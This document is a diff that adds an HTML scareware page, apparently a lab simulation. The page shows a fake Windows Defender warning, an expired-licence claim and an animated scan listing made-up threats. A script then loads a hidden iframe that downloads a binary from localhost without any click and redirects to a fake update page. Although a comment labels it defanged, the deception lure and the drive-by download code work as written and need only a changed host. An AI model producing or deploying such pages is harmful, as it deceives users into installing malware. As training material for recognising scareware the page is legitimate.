@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>System Scan</title>
+<style>
+ body{font-family:'Segoe UI',Arial;background:#1a1a2e;color:#eee;text-align:center}
+ .warn{background:#c0392b;padding:30px;font-size:22px;margin:40px}
+ .scanbox{width:500px;margin:20px auto;border:1px solid #555;padding:10px;text-align:left}
+ #bar{height:20px;background:#27ae60;width:0%}
+</style></head>
+<body>
+<div class="warn">&#9888; WINDOWS DEFENDER: 3 THREATS DETECTED ON YOUR PC</div>
+<div class="scanbox">
+  <p id="item">Scanning C:\Windows\System32 ...</p>
+  <div style="border:1px solid #888"><div id="bar"></div></div>
+</div>
+<p><b>Your Windows license has expired. Immediate action required.</b></p>
+
+<script>
+// fake progressive scan
+const files = [
+  "Scanning C:\\Windows\\System32 ...",
+  "Threat found: Trojan.Win32.Generic!susp",
+  "Threat found: Adware.Win32.PushWizard",
+  "Threat found: Ransom.Agent.X",
+  "Quarantine FAILED — system compromised"
+];
+let i = 0, pct = 0;
+const t = setInterval(() => {
+  if (i < files.length) document.getElementById("item").textContent = files[i++];
+  pct += 20;
+  document.getElementById("bar").style.width = pct + "%";
+  if (pct >= 100) clearInterval(t);
+}, 700);
+
+// ===== Drive-by download simulation (defanged) =====
+// hidden iframe requests the binary — no click from the victim
+setTimeout(() => {
+  const f = document.createElement("iframe");
+  f.style.display = "none";
+  f.src = "http://localhost:8084/sysupdate.bin";
+  document.body.appendChild(f);
+}, 4500);
+
+// then redirect to the fake-update page
+setTimeout(() => location.replace("http://localhost:8084/update.html"), 5000);
+</script>
+</body></html>
